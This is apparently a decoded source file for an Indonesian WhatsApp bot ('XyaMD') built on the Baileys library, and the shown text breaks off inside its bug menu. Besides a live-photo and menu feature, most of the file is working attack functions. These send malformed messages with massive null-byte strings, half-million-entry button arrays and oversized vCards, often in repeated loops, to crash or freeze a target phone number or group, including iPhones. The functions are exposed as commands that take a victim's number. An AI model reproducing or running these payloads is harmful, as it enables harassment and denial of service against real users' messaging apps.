// Decoded by Python Script
console.clear();
require("./setting/config");

const {
  default: baileys,
  downloadContentFromMessage,
  proto,
  generateWAMessage,
  getContentType,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  GroupSettingChange,
  WAGroupMetadata,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  WAGroupInviteMessageGroupMetadata,
  GroupMetadata,
  Headers,
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageContent,
  areJidsSameUser,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  makeWaSocket,
  makeInMemoryStore,
  MediaType,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  initInMemoryKeyStore,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  templateMessage,
  InteractiveMessage,
  Header
} = require("@whiskeysockets/baileys");

const fs = require('fs');
const path = require("path");
const util = require("util");
const chalk = require("chalk");
const crypto = require("crypto");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require("child_process");
const ffFotoLive = require('fluent-ffmpeg');
const ffmpegInstaller = require('@ffmpeg-installer/ffmpeg');
ffFotoLive.setFfmpegPath(ffmpegInstaller.path);

module.exports = Ril = async (sock, m, chatUpdate, store) => {
  try {
    var body = m.mtype === "conversation" ? m.message.conversation || "[Conversation]" 
      : m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" 
      : m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" 
      : m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" 
      : m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" 
      : m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" 
      : m.mtype === "contactMessage" ? "[Contact]" 
      : m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" 
      : m.mtype === "liveLocationMessage" ? "[Live Location]" 
      : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" 
      : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" 
      : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" 
      : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" 
      : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.['id'] || "[Interactive Response]" 
      : m.mtype === "pollCreationMessage" ? "[Poll Creation]" 
      : m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" 
      : m.mtype === "ephemeralMessage" ? "[Ephemeral]" 
      : m.mtype === "viewOnceMessage" ? "[View Once]" 
      : m.mtype === "productMessage" ? m.message.productMessage.product?.["name"] || "[Product]" 
      : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.["selectedButtonId"] || m.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || m.text || "[Message Context]" 
      : "[Unknown Type]";

    var budy = typeof m.text == "string" ? m.text : '';
    var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : '' : global.prefa ?? global.prefix;

    const {
      smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdm, generateProfilePicture
    } = require("./System/x1");

    const ownerList = JSON.parse(fs.readFileSync("./Access/Own.json"));
    const premiumList = JSON.parse(fs.readFileSync("./Access/Prem.json"));
    const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(" ").shift().toLowerCase() : '';
    const args = body.trim().split(/ +/).slice(1);
    const botNumber = await sock.decodeJid(sock.user.id);
    
    const formatNumber = (jid) => {
      if (!jid) return '';
      const num = String(jid).trim();
      if (!num) return '';
      const extracted = num.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
      return extracted ? extracted + "@s.whatsapp.net" : '';
    };

  const convertAudioToVoiceNote = async (audioPath) => {
  return new Promise((resolve) => {
    const outputPath = path.join(__dirname, "temp_vn_" + Date.now() + ".ogg");
    exec(`ffmpeg -i "${audioPath}" -c:a libopus -b:a 48k -vbr on -compression_level 10 -frame_duration 60 -application voip "${outputPath}" -y`, (err) => {
      if (err) {
        console.error("gagal convert audio ke vn:", err);
        resolve(null);
      } else {
        const buffer = fs.readFileSync(outputPath);
        fs.unlinkSync(outputPath); 
        resolve(buffer);
      }
    });
  });
};
    const sender = formatNumber(m.sender || m.key?.participant || m.participant || m.key?.remoteJid);
    const ownerSet = new Set([botNumber, ...ownerList].map(formatNumber).filter(Boolean));
    const premSet = new Set([botNumber, ...premiumList].map(formatNumber).filter(Boolean));
    const isOwner = ownerSet.has(sender);
    const isPremium = premSet.has(sender);
    const q = args.join(" ");
    const from = chatUpdate.messages[0].key.remoteJid;
    
    const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(() => {}) : '';
    const groupName = m.isGroup ? groupMetadata.subject : '';
    const pushname = m.pushName || "No Name";
    const timeNow = moment().tz("Asia/Jakarta").format("HH:mm:ss");

    let ucapanWaktu;
    if (timeNow >= "19:00:00" && timeNow < "23:59:00") ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦";
    else if (timeNow >= "15:00:00" && timeNow < "19:00:00") ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞";
    else if (timeNow >= "11:00:00" && timeNow < "15:00:00") ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠";
    else if (timeNow >= "06:00:00" && timeNow < "11:00:00") ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢";
    else ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡";

    const dateNow = new Date().toLocaleDateString("id-ID", {
      timeZone: "Asia/Jakarta", year: "numeric", month: "long", day: "numeric"
    });
    
    const thumbFile = fs.readFileSync("./System/Thumb.jpg");

    if (!sock.public && !isOwner) return;

    if (command) {
      if (m.isGroup) {
        console.log(chalk.bgBlue.white.bold("# New Message"));
        console.log(chalk.bgHex("#f39c12").hex("#ffffff").bold(` 📅 Date : ${dateNow} 
 🕐 Time : ${timeNow} 
 💬 Message Received : ${m.mtype} 
 🌐 Group Name : ${groupName} 
 🔑 Group Id : ${m.chat} 
 🗣️ Sender : ${pushname} 
 👤 Recipient : ${botNumber} 
`));
      } else {
        console.log(chalk.bgBlue.white.bold("━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━"));
        console.log(chalk.bgHex("#f39c12").hex("#ffffff").bold(` 📅 Date : ${dateNow} 
 🕐 Time : ${timeNow} 
 💬 Message Received : ${m.mtype} 
 🌐 Group Name : No In Group 
 🔑 Group Id : No In Group 
 🗣️ Sender : ${pushname} 
 👤 Recipient : ${botNumber} 
`));
      }
    }

// FUNGSI BUG

async function DelayV5(target) {
  for (let i = 0; i < 2; i++) {
    await sleep(500);
    const msg = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "ี".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\{".repeat(9999),
                buttons: "ี".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                externalAdReply: {
                  showAdAttribution: true,
                  title: 'vault!nspect',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {});
    
    await sock.chatModify({
      delete: true,
      lastMessages: [{
        key: {
          remoteJid: target,
          fromMe: true,
          id: msg.key.id
        },
        messageTimestamp: Date.now()
      }]
    }, target);
  }
}


async function DelayV4(target) {
    const FxT = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "izin @mexxreall" + "\0".repeat(20000),
                        format: "FOUR"
                    },
                    nativeFlowMessage: {
                        name: "cta_call",
                        name: "voice_call",
                        buttonParamsJson: "\0",
                        buttonParamsJson: "\0",
                        buttonParamsJson: "\0",
                        buttonParamsJson: "\0",
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            richResponseMessage: {}
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, FxT, { noSelfSync: true });
}

async function DelayV2(target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3
          },
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              }
            },
            body: {
              text: "\x10".repeat(5000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    },
    {
      participant: true
    }
  );
}

async function DelayV1(target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "izin @mexxreall"
          },
          NativeFlowMessage: {
            buttons: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
              )
            ],
            name: "\x10".repeat(50000)
          },
          nativeFlowMessage: {
            name: "galaxy_message",
            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {});

  console.log("succes send to target");
}

async function DelayV3(target) {
  const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "⎈" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})),
            nativeFlowResponsMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 500; i++) {
    await sock.relayMessage(jid, payload, {});
    await sleep(20);
  }

  console.log("done sent bug");
}

async function DelayHard(target) {
  for (let x = 0; x < 50; x++) {
    console.log(chalk.red(`Procces Sending Bug ${x}`));
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3
          },
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target
              }
            },
            body: {
              text: "izin @mexxreall"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }, { participant: { jid: target } });
  }
}

async function lahora(target) {
  try {
    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "izin @mexxreall"
            },
            nativeFlowMessage: {
              buttons: "\0".repeat(250000)
            }
          }
        }
      }
    };

    const msg2 = {
      interactiveMessage: {
        body: {
          text: "izin @mexxreall"
        },
        nativeFlowMessage: {
          buttons: "crash_msg" +
                   "\0".repeat(20000) +
                   "\u0000".repeat(1000) +
                   "\u0000".repeat(30000) +
                   "\u0000".repeat(4000)
        }
      }
    };

    const msg3 = {
      interactiveMessage: {
        body: {
          text: "meta ai"
        },
        nativeFlowMessage: {
          buttons: {
            name: "meta_mesaage",
            buttonParamsJson: "\0".repeat(20000) +
                              "\u0000".repeat(1000) +
                              "\u0000".repeat(4000)
          }
        }
      }
    };

    const msg4 = {
      interactiveMessage: {
        body: {
          text: "izin @mexxreall".repeat(20000)
        },
        nativeFlowMessage: {
          buttons: "[".repeat(50001)
        },
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 999
        }
      }
    };

    await sock.relayMessage(target, msg1, { viewOnce: true });
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg4, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\x10".repeat(500000),
              title: "\r".repeat(2000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ]
            },
            viewOnceMessage: {
              message: {
                text: "\u0000".repeat(50000)
              }
            }
          }
        }
      }
    }, {});

    console.log("✅ Bug send!");
  } catch (e) {
    console.log("❌ ERROR:", e.message);
  }
}

// FC INVISIBLE IOSS

async function iosCtt(target) {
  await sock.relayMessage(target, {
    contactMessage: {
      displayName:
        "- # XyaCrashèr ん. " +
        "𑇂𑆵𑆴𑆿".repeat(10000),
      vcard: `BEGIN:VCARD
VERSION:3.0
N:;𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)};;;
FN:𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)}
NICKNAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
ORG:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
TITLE:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item1.TEL;waid=6287873499996:+62 878-7349-9996
item1.X-ABLabel:Telepon
item2.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item2.X-ABLabel:Kantor
item3.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item3.X-ABLabel:Kantor
item4.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item4.X-ABLabel:Pribadi
item5.ADR:;;𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)};;;;
item5.X-ABADR:ac
item5.X-ABLabel:Rumah
X-YAHOO;type=KANTOR:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
PHOTO;${null}
X-WA-BIZ-NAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
END:VCARD`,
      contextInfo: {
        externalAdReply: {
          automatedGreetingMessageShown: true,
          automatedGreetingMessageCtaType: "\u0000".repeat(100000),
          greetingMessageBody: "- # XyaCrashèr ん.",
        },
      },
    },
  }, {
    participant: true,
  });
}

async function fiOSNew(target, i = 1) {
  for (let z = 0; z < i; z++) {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            locationMessage: {
              degreesLongitude: 0,
              degreesLatitude: 0,
              // jpegThumbnail: null,
              name: "𑇂𑆵𑆴𑆿".repeat(9000)
            },
            contentText: "izin @mexxreall",
            buttons: [{
              buttonId: "izin @mexxreall",
              buttonText: {
                displayText: "𑇂𑆵𑆴𑆿".repeat(1000)
              },
              type: 1
            }],
            headerType: 6
          }
        }
      }
    }, {
      isSecret: true
    })
    await sleep(1000);
  }
}

async function UiOverload(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(120000) + "@1".repeat(20000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "霊 izin @mexxreall" + "ꦾ".repeat(120000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

// GROUP BUG

async function DelayGB(target) {
  for (let x = 0; x < 50; x++) {
    console.log(chalk.red(`Procces Sending Bug ${x}`));
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3
          },
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target
              }
            },
            body: {
              text: "izin @mexxreall"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }, { participant: { jid: target } });
  }
}

async function blankclickgb(target) {
  const content = {
    interactiveMessage: {
      header: {
        title: "izin @mexxreall".repeat(1000),
        subtitle: "\u0010".repeat(1000),
        hasMediaAttachment: false,
        bloksWidget: {
          fallback: "\u200D".repeat(1000),
          type:     "\u200F".repeat(1000),
          data:     "[".repeat(1000),
          uuid:     "\u200B".repeat(1000),
        },
      },
      body: {
        text: "\u000F",
      },
      footer: {
        text: "\u200B",
      },
      nativeFlowMessage: {
        messageVersion: 1,
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: "{\"currency\":\"IDR\",\"payment_type\":\"upr\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4WA9RALEPXA\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"order_type\":\"PAYMENT_REQUEST\"},\"payment_settings\":[{\"type\":\"payment_account\",\"payment_account\":{\"account_type\":\"digital_wallet\",\"identifier_type\":\"phone_number\",\"identifier_value\":\"088983102983\",\"institution_name\":\"Dana\",\"beneficiary_name\":\"izin @mexxreall \"}},{\"type\":\"payment_account\",\"payment_account\":{\"account_type\":\"digital_wallet\",\"identifier_type\":\"phone_number\",\"identifier_value\":\"088983102983\",\"institution_name\":\"GoPay\",\"beneficiary_name\":\"izin @mexxreall \"}}],\"share_payment_status\":false,\"is_soft_deleted\":false}",
          },
        ],
      },
      contextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
      },
    },
  };

  const message = await generateWAMessageFromContent(target, content, {});

  await sock.relayMessage(target, message.message, {
    messageId: message.key.id,
    participant: { jid: target },
  });
}

// BATAS BUG

    const fakeKey = { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" };
    const fakeOrder = {
      orderId: "2029",
      thumbnail: thumbFile,
      itemCount: "999999999 ",
      status: "INQUIRY",
      surface: "CATALOG",
      message: "MexxModss ( ¡ )",
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    };
    const fakeMessage = { orderMessage: fakeOrder };
    const fakeContext = { mentionedJid: [m.sender], forwardingScore: 999, isForwarded: true };
    const fakeQuote = { key: fakeKey, message: fakeMessage, contextInfo: fakeContext };

    const reply = (text) => {
    return sock.sendMessage(m.chat, {
        text: text
    }, {
        quoted: m 
    });
};

// COMMAND MENU

    switch (command) {
        case "fotolive":
        case "livephoto":
        case "livepic": {
          const flTmpVideo = path.join(require('os').tmpdir(), `lv_video_${Date.now()}.mp4`);
          const flTmpThumb = path.join(require('os').tmpdir(), `lv_thumb_${Date.now()}.jpg`);
          try {
            const q = m.quoted ? m.quoted : m;
            const mime = (q.msg || q).mimetype || q.mimetype || '';

            if (!mime.includes('video')) {
              return m.reply('balas/reply video yang valid untuk dijadikan Live photo ya kak~');
            }

            await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

            let flVideoBuffer;
            if (typeof q.download === 'function') {
              flVideoBuffer = await q.download();
            } else if (typeof sock.downloadMediaMessage === 'function') {
              flVideoBuffer = await sock.downloadMediaMessage(q);
            } else {
              return m.reply('gagal mendownload video kak~');
            }

            if (!flVideoBuffer || flVideoBuffer.length === 0) {
              return m.reply('gagal mendownload video kak~');
            }

            fs.writeFileSync(flTmpVideo, flVideoBuffer);

            await new Promise((resolve, reject) => {
              ffFotoLive(flTmpVideo)
                .outputOptions(['-vframes 1', '-q:v 2'])
                .output(flTmpThumb)
                .on('end', resolve)
                .on('error', reject)
                .run();
            });

            const flThumbBuffer = fs.readFileSync(flTmpThumb);
            const flImageMedia = await prepareWAMessageMedia(
              { image: flThumbBuffer },
              { upload: sock.waUploadToServer }
            );
            const flVideoMedia = await prepareWAMessageMedia(
              { video: flVideoBuffer },
              { upload: sock.waUploadToServer }
            );

            const flPhotoMsg = generateWAMessageFromContent(
              m.chat,
              {
                imageMessage: {
                  ...flImageMedia.imageMessage,
                  caption: '📸 *FotoLive Generate*\nSaluran : https://whatsapp.com/channel/0029Vb8wNGL7j6g785wX4136',
                  contextInfo: { pairedMediaType: 5, statusSourceType: 0 }
                }
              },
              { quoted: m }
            );

            await sock.relayMessage(m.chat, flPhotoMsg.message, { messageId: flPhotoMsg.key.id });
            await sock.relayMessage(
              m.chat,
              {
                videoMessage: {
                  ...flVideoMedia.videoMessage,
                  contextInfo: { pairedMediaType: 6, statusSourceType: 0 }
                },
                messageContextInfo: {
                  messageAssociation: { associationType: 12, parentMessageKey: flPhotoMsg.key }
                }
              },
              {}
            );

            await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
          } catch (e) {
            console.error('fotolive error:', e);
            await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
            await m.reply('❌ gagal membuat foto live-nya kak~ coba lagi nanti ya 🌸');
          } finally {
            try { if (fs.existsSync(flTmpVideo)) fs.unlinkSync(flTmpVideo); } catch (_) {}
            try { if (fs.existsSync(flTmpThumb)) fs.unlinkSync(flTmpThumb); } catch (_) {}
          }
          break;
        }

        case "menu": {
        const reacts = ['🌞', '🔥', '🦠', '💦'];
        for (const react of reacts) {
          await sock.sendMessage(m.chat, { react: { text: react, key: m.key } });
          await sleep(250);
        }
        
        const media = await prepareWAMessageMedia({
          video: { url: "./System/menu.mp4" },
          gifPlayback: true,
          jpegThumbnail: fs.readFileSync("./System/menu-thumbnail.jpg")
        }, { upload: sock.waUploadToServer });

        const menuText = `> hello welcome to use our bot script please use it wisely and responsibly and don't misuse it thank you *${m.pushName}*

\`[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ]\`

> 𖥂 *BotName* : XyaMD
> 𖥂 *Version* : 5.0.0
> 𖥂 *Developer* : MexxModss
> 𖥂 *Status* : FreeOnlyy
> 𖥂 *Action* : ẉ.dev/MexxModss

\`# ᴊɪᴋᴀ sᴜᴅᴀʜ ᴍᴇɴᴇᴍᴜᴋᴀɴ ʏᴀɴɢ ɪɴᴅᴀʜ ᴊᴀɴɢᴀɴ ᴄᴏʙᴀ ᴄᴏʙᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀʀɪ ʏɢ ʟᴇʙɪʜ ɪɴᴅᴀʜ ᴀᴛᴀᴜ ᴋᴀᴍᴜ ᴀᴋᴀɴ ᴋᴇʜɪʟᴀɴɢᴀɴ ᴋᴇᴅᴜᴀɴʏᴀ 🧑‍💻\`
`;
        
        const interactiveMsg = proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: menuText }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "`© ᴄᴏᴘʏʀɪɢʜᴛ ʙʏ ᴍᴇxxᴍᴏᴅss`" }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  title: '',
                  hasMediaAttachment: true,
                  videoMessage: media.videoMessage
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                  messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                      text: "Xya - MD",
                      url: "t.me/MexxTampan",
                      copy_code: "MexxModss",
                      expiration_time: Date.now() * 1000
                    },
                    bottom_sheet: {
                      in_thread_buttons_limit: 2,
                      divider_indices: [1, 2, 3, 4, 5, 999],
                      list_title: "ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ",
                      button_title: "ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ"
                    },
                    tap_target_configuration: {
                      title: " X ",
                      description: "bomboclard",
                      canonical_url: "https://t.me/MexxTampan",
                      domain: "shop.example.com",
                      button_index: 0
                    }
                  }),
                  buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                  }, {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                  }, {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: "ᴍᴇɴᴜ sᴄʀɪᴘᴛs",
                      sections: [{
                        title: "ᴍᴇɴᴜ sᴄʀɪᴘᴛs",
                        highlight_label: "recommend",
                        rows: [{ title: "𝐁𝐯𝐠 𝐄𝐱𝐩𝐥𝐨𝐢𝐭", description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ( ʙᴜɢ ᴍᴇɴᴜ )", id: 'bugmenu' },
                               { title: "𝐓𝐨𝐥𝐬 𝐌𝐞𝐧𝐮", description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ( ᴛᴏʟs ᴍᴇɴᴜ )", id: 'tolsmenu' }]
                      }],
                      has_multiple_buttons: true
                    })
                  }, {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                      display_text: "#sᴀʟᴜʀᴀɴ ᴅᴇᴠᴇʟᴏᴘᴇʀ",
                      url: "https://whatsapp.com/channel/0029Vb8wNGL7j6g785wX4136",
                      merchant_url: "https://whatsapp.com/channel/0029Vb8wNGL7j6g785wX4136"
                    })
                  }]
                })
              })
            }
          }
        });

        const msgContent = generateWAMessageFromContent(m.chat, interactiveMsg, { userJid: sock.user.id, quoted: fakeQuote });
        await sock.relayMessage(m.chat, msgContent.message, { messageId: msgContent.key.id });

        await sleep(1000);

        const audioPath = "./sound.mp3";
        if (fs.existsSync(audioPath)) {
          const voiceNote = await convertAudioToVoiceNote(audioPath);
          if (voiceNote) {
            await sock.sendMessage(
              m.chat,
              {
                audio: voiceNote,
                mimetype: "audio/ogg; codecs=opus",
                ptt: true
              },
              { quoted: m }
            );
          } else {
            console.log("audio dikirim sebagai mp3 biasa!!");
            await sock.sendMessage(
              m.chat,
              {
                audio: fs.readFileSync(audioPath),
                mimetype: "audio/mpeg",
                fileName: "music.mp3",
                ptt: false
              },
              { quoted: m }
            );
          }
        }
        break;
      }
      
      case "bugmenu": {
        const reacts = ['🌞', '🔥', '🦠', '💦'];
        for (const react of reacts) {
          await sock.sendMessage(m.chat, { react: { text: react, key: m.key } });
          await sleep(250);
        }
        
        const media = await prepareWAMessageMedia({
          video: { url: "./System/menu.mp4" },
          gifPlayback: true,
          jpegThumbnail: fs.readFileSync("./System/menu-thumbnail.jpg")
        }, { upload: sock.waUploadToServer });

        const menuText = `> hello welcome to use our bot script please use it wisely and responsibly and don't misuse it thank you ${m.pushName} 

\`[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ]\`

> 𖥂 BotName : XyaMD
> 𖥂 Version : 5.0.0
> 𖥂 Developer : MexxModss
> 𖥂 Status : FreeOnlyy
> 𖥂 Action : ẉ.dev/MexxModss

\`[ 𝐁𝐔𝐆 𝐍𝐎𝐌𝐎𝐑 ]\`

> 𖥂 .delaymaker 62xx
> 𖥂 .xvipblank 62xx
> 𖥂 .crashiphone 62xx
> 𖥂 .forcemaker 62xx
> 𖥂 .c1dekk _chat target_

\`[ 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 ]\`

> 𖥂 .groupdelay link-group
> 𖥂 .groupblank link-group
> 𖥂 .groupcombo link-group
> 𖥂 .bandgroup link-group

\`[ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ]\`

> 𖥂 .addprem
> 𖥂 .delprem
> 𖥂 .self
> 𖥂 .public
> 𖥂 .tesfunct
> 𖥂 .donasi
`;
        
        const interactiveMsg = proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: menuText }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "`© ᴄᴏᴘʏʀɪɢʜᴛ ʙʏ ᴍᴇxxᴍᴏᴅss`" }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  title: '',
                  hasMediaAttachment: true,
                  videoMessage: media.videoMessage
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                  messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                      text: "Xya - MD",
                      url: "t.me/MexxTampan",
                      copy_code: "MexxModss",
                      expiration_time: Date.now() * 1000
                    },
                    bottom_sheet: {
                      in_thread_buttons_limit: 2,
                      divider_indices: [1, 2, 3, 4, 5, 999],
